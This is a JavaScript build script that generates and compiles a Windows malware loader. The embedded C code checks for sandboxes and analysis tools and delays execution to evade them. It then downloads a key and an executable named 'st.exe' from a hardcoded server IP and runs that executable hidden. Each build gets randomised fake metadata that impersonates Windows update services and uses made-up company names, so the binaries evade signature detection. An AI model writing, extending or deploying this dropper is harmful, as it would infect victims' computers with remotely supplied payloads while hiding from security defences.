// language: JavaScript, file: builder/compile.js
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

function makeRng(seed) {
  let s = (seed >>> 0) || 1;
  return {
    next() {
      s = (s + 0x6D2B79F5) | 0;
      let t = Math.imul(s ^ (s >>> 15), 1 | s);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    },
    int(max) { return Math.floor(this.next() * max); },
    pick(arr) { return arr[this.int(arr.length)]; },
    hex(len) {
      const chars = '0123456789abcdef';
      let out = '';
      for (let i = 0; i < len; i++) out += chars[this.int(16)];
      return out;
    },
  };
}

const COMPANIES = [
  'Acme Software Inc.', 'Contoso Ltd.', 'Initech Systems', 'Globex Corporation',
  'Northwind Traders', 'Umbrella Data Systems', 'Stark Industries', 'Wayne Enterprises',
  'Cyberdyne Systems', 'Soylent Corp', 'Tyrell Corporation', 'Wonka Industries',
  'Massive Dynamic', 'Hooli Inc.', 'Pied Piper', 'Aperture Science',
  'Black Mesa Research', 'Vandelay Industries', 'Dunder Mifflin', 'Sterling Cooper',
  'Bluth Company', 'Prestige Worldwide', 'Wernham Hogg', 'Sabre Corp',
  'Virtucon', 'Zorg Industries', 'Rekall Inc.', 'Omni Consumer Products',
  'Cybertek Systems', 'Virtucom Networks',
];

const PRODUCTS = [
  'Update Helper', 'System Updater', 'Security Assistant', 'Network Utility',
  'Runtime Manager', 'Driver Updater', 'Component Service', 'Platform Sync',
  'Data Assistant', 'Windows Helper', 'Session Manager', 'Resource Monitor',
  'Update Center', 'System Sync', 'Client Service', 'Maintenance Tool',
  'Diagnostics Helper', 'Support Utility', 'Sync Agent', 'Config Manager',
  'Background Service', 'Platform Agent',
];

const FILE_DESCRIPTIONS = [
  'Windows Update Helper', 'System Maintenance Utility', 'Background Update Service',
  'Network Sync Helper', 'Component Update Agent', 'System Resource Manager',
  'Platform Diagnostics', 'Runtime Assistant', 'Update Synchronization Service',
  'Background Helper Utility', 'Client Update Agent',
];

const INTERNAL_NAMES = [
  'wuauclt', 'wupdater', 'syshelper', 'updater', 'syssync', 'svcman',
  'helper', 'diaghost', 'winsupd', 'synchronizer', 'clientsvc', 'rtsvc',
  'svchostx', 'sysmain',
];

const COPYRIGHT_YEARS = ['2019', '2020', '2021', '2022', '2023', '2024', '2025'];

export function randomBuildMeta(seed) {
  const rng = makeRng(seed);
  const build = 19041 + rng.int(300);
  const patch = rng.int(1000);
  const version = `10.0.${build}.${patch}`;
  const versionComma = `10,0,${build},${patch}`;
  const guid =
    `{${rng.hex(8)}-${rng.hex(4)}-${rng.hex(4)}-${rng.hex(4)}-${rng.hex(12)}}`.toUpperCase();
  const buildNonce = Array.from({ length: 16 }, () => rng.int(256));

  return {
    seed,
    company:        rng.pick(COMPANIES),
    product:        rng.pick(PRODUCTS),
    fileDesc:       rng.pick(FILE_DESCRIPTIONS),
    internalName:   rng.pick(INTERNAL_NAMES),
    version,
    versionComma,
    copyright:      `Copyright (C) ${rng.pick(COPYRIGHT_YEARS)} ${rng.pick(COMPANIES)}`,
    guid,
    buildNonce,
    retries:        3 + rng.int(4),
    retryDelaySec:  1 + rng.int(4),
    initialSleepMs: 800 + rng.int(2500),
    logName:        rng.pick(['update.log', 'sync.log', 'service.log', 'agent.log', 'helper.log']),
  };
}

function cSource(meta, ip, buildId) {
  const keyUrl = `http://${ip}/api/getkey/${buildId}`;
  const stUrl  = `http://${ip}/api/downloads/st.exe`;
  const esc4c  = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  const nonceArr = meta.buildNonce.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');

  return String.raw`
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "ws2_32.lib")

__attribute__((used))
static const wchar_t META_GUID[]    = L"${esc4c(meta.guid)}";
__attribute__((used))
static const wchar_t META_PRODUCT[] = L"${esc4c(meta.product)}";
__attribute__((used))
static const wchar_t META_COMPANY[] = L"${esc4c(meta.company)}";
__attribute__((used))
static const char    BUILD_NONCE[16] = { ${nonceArr} };

__attribute__((used))
static const wchar_t CONFIG_BLOB[] =
    L"[agent]\n"
    L"guid=${esc4c(meta.guid)}\n"
    L"version=${esc4c(meta.version)}\n"
    L"product=${esc4c(meta.product)}\n"
    L"endpoint=${esc4c(stUrl)}\n"
    L"interval=${meta.retries * 600}\n";

static const char CFG_IP[] = "${esc4c(ip)}";
static const char CFG_KEY_PATH[] = "/api/getkey/${buildId}";
static const char CFG_ST_PATH[]  = "/api/downloads/st.exe";

#define INITIAL_SLEEP_MS ${meta.initialSleepMs}
#define RETRIES          ${meta.retries}
#define RETRY_DELAY_SEC  ${meta.retryDelaySec}
#define LOG_NAME_W       L"${esc4c(meta.logName)}"

static void log_msg(const wchar_t* msg) {
    wchar_t appdata[MAX_PATH], path[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata))) return;
    _snwprintf(path, MAX_PATH, L"%ls\\%ls", appdata, LOG_NAME_W);
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    SetFilePointer(h, 0, NULL, FILE_END);
    WriteFile(h, msg, (DWORD)(wcslen(msg) * sizeof(wchar_t)), &w, NULL);
    WriteFile(h, L"\r\n", 4, &w, NULL);
    CloseHandle(h);
}

static int size_ok(const wchar_t* p, long long min_size) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    LARGE_INTEGER sz = {0};
    GetFileSizeEx(h, &sz);
    CloseHandle(h);
    return sz.QuadPart >= min_size;
}

static int is_valid_pe(const wchar_t* p) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    IMAGE_DOS_HEADER dos;
    DWORD rd = 0;
    if (!ReadFile(h, &dos, sizeof(dos), &rd, NULL) || rd != sizeof(dos)) {
        CloseHandle(h); return 0;
    }
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) { CloseHandle(h); return 0; }

    SetFilePointer(h, dos.e_lfanew, NULL, FILE_BEGIN);
    DWORD nt_sig = 0;
    if (!ReadFile(h, &nt_sig, sizeof(nt_sig), &rd, NULL) || rd != sizeof(nt_sig)) {
        CloseHandle(h); return 0;
    }
    CloseHandle(h);
    return nt_sig == IMAGE_NT_SIGNATURE;
}

static int http_get(const char* host, const char* path, const wchar_t* dest) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 0;

    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(host, "80", &hints, &res) != 0) { WSACleanup(); return 0; }
    
    SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) { freeaddrinfo(res); WSACleanup(); return 0; }

    DWORD timeout = 10000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
        closesocket(sock); freeaddrinfo(res); WSACleanup(); return 0;
    }
    freeaddrinfo(res);

    char req[1024];
    // Force HTTP/1.0 to avoid chunked encoding
    _snprintf(req, sizeof(req),
        "GET %s HTTP/1.0\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Accept: */*\r\n\r\n", path, host);

    if (send(sock, req, (int)strlen(req), 0) == SOCKET_ERROR) {
        closesocket(sock); WSACleanup(); return 0;
    }

    char buf[8192];
    int bytes = 0;
    int header_done = 0;
    char h_buf[4] = {0};
    char header_acc[4096] = {0};
    int header_acc_len = 0;
    int content_length = -1;
    int total_written = 0;

    HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { closesocket(sock); WSACleanup(); return 0; }

    while ((bytes = recv(sock, buf, sizeof(buf), 0)) > 0) {
        int offset = 0;
        if (!header_done) {
            for (int i = 0; i < bytes; i++) {
                h_buf[0] = h_buf[1];
                h_buf[1] = h_buf[2];
                h_buf[2] = h_buf[3];
                h_buf[3] = buf[i];
                
                if (header_acc_len < sizeof(header_acc) - 1) {
                    header_acc[header_acc_len++] = buf[i];
                }

                if (h_buf[0]=='\r' && h_buf[1]=='\n' && h_buf[2]=='\r' && h_buf[3]=='\n') {
                    header_done = 1;
                    offset = i + 1;
                    header_acc[header_acc_len] = '\0';
                    
                    char* cl = strstr(header_acc, "Content-Length:");
                    if (cl) content_length = atoi(cl + 15);
                    break;
                }
            }
            if (!header_done) continue;
        }
        
        int to_write = bytes - offset;
        if (content_length >= 0 && total_written + to_write > content_length) {
            to_write = content_length - total_written;
        }
        
        if (to_write > 0) {
            DWORD w = 0;
            WriteFile(hFile, buf + offset, to_write, &w, NULL);
            total_written += w;
        }
        
        if (content_length >= 0 && total_written >= content_length) break;
    }

    CloseHandle(hFile);
    closesocket(sock);
    WSACleanup();
    return size_ok(dest, 100);
}

static int is_sandboxed(void) {
    wchar_t sb[] = { L'S', L'b', L'i', L'e', L'D', L'l', L'l', L'.', L'd', L'l', L'l', 0 };
    if (GetModuleHandleW(sb)) return 1;
    wchar_t cv[] = { L'c', L'm', L'd', L'v', L'r', L't', L'3', L'2', L'.', L'd', L'l', L'l', 0 };
    if (GetModuleHandleW(cv)) return 1;

    if (GetTickCount64() < 10ULL * 60 * 1000) return 1;

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;

    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    if (is_sandboxed()) {
        Sleep(180000 + (GetTickCount() % 300000));
        return 0;
    }

    Sleep(INITIAL_SLEEP_MS);

    wchar_t appdata[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
    wchar_t dir[MAX_PATH], keyPath[MAX_PATH], stPath[MAX_PATH];
    _snwprintf(dir,     MAX_PATH, L"%ls\\loader", appdata);
    _snwprintf(keyPath, MAX_PATH, L"%ls\\key.json", dir);
    _snwprintf(stPath,  MAX_PATH, L"%ls\\st.exe",   dir);
    CreateDirectoryW(dir, NULL);

    int need_key = !size_ok(keyPath, 10);
    int need_st  = !is_valid_pe(stPath);

    if (need_key || need_st) {
        log_msg(L"update start");
        for (int i = 0; i < RETRIES && (need_key || need_st); i++) {
            if (need_key) {
                if (http_get(CFG_IP, CFG_KEY_PATH, keyPath) && size_ok(keyPath, 10)) {
                    log_msg(L"key ok");
                    need_key = 0;
                } else {
                    log_msg(L"key fail");
                    Sleep((DWORD)RETRY_DELAY_SEC * 1000);
                }
            }
            if (need_st) {
                if (http_get(CFG_IP, CFG_ST_PATH, stPath) && is_valid_pe(stPath)) {
                    log_msg(L"st ok");
                    need_st = 0;
                } else {
                    log_msg(L"st fail");
                    DeleteFileW(stPath);
                    Sleep((DWORD)RETRY_DELAY_SEC * 1000);
                }
            }
        }
        if (need_st) { log_msg(L"giving up"); return 1; }
    }

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    wchar_t cmd[MAX_PATH];
    _snwprintf(cmd, MAX_PATH, L"\"%ls\"", stPath);
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS,
                   NULL, dir, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    return 0;
}
`;
}

function rcSource(meta) {
  const esc4rc = (s) => String(s).replace(/"/g, '""');
  return `
#include <windows.h>
1 ICON "icon.ico"
VS_VERSION_INFO VERSIONINFO
FILEVERSION     ${meta.versionComma}
PRODUCTVERSION  ${meta.versionComma}
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "${esc4rc(meta.company)}"
            VALUE "FileDescription",  "${esc4rc(meta.fileDesc)}"
            VALUE "FileVersion",      "${meta.version}"
            VALUE "InternalName",     "${meta.internalName}"
            VALUE "OriginalFilename", "${meta.internalName}.exe"
            VALUE "ProductName",      "${esc4rc(meta.product)}"
            VALUE "ProductVersion",   "${meta.version}"
            VALUE "LegalCopyright",   "${esc4rc(meta.copyright)}"
        END
    END
END
`;
}

export async function compileLauncher({ key, config, baseExe, buildId }) {
  const ip = (config && config.ip) || process.env.SERVER_IP || '95.182.96.216';

  const seed = ((buildId >>> 0) * 2654435761 ^ crypto.randomBytes(4).readUInt32LE(0)) >>> 0;
  const meta = randomBuildMeta(seed);

  console.log(`[launcher] seed=${seed} product="${meta.product}" version=${meta.version}`);

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const cPath   = path.join(workDir, 'launcher.c');
  const rcPath  = path.join(workDir, 'app.rc');
  const resPath = path.join(workDir, 'app.res');
  const outPath = path.join(workDir, 'launcher.exe');

  fs.writeFileSync(cPath, cSource(meta, ip, buildId));
  fs.writeFileSync(rcPath, rcSource(meta));

  const iconSrc = path.join(__dirname, '..', 'icon.ico');
  if (fs.existsSync(iconSrc)) {
    fs.copyFileSync(iconSrc, path.join(workDir, 'icon.ico'));
  } else {
    fs.writeFileSync(path.join(workDir, 'icon.ico'),
      Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex'));
  }

  try {
    await execFileP(WINDRES, ['-I', workDir, '-i', rcPath, '-o', resPath,
                              '--input-format=rc', '--output-format=coff'],
                    { cwd: workDir, timeout: 30_000 });
    await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
                         '-lws2_32', '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
                    { cwd: workDir, timeout: 60_000 });
    return fs.readFileSync(outPath);
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}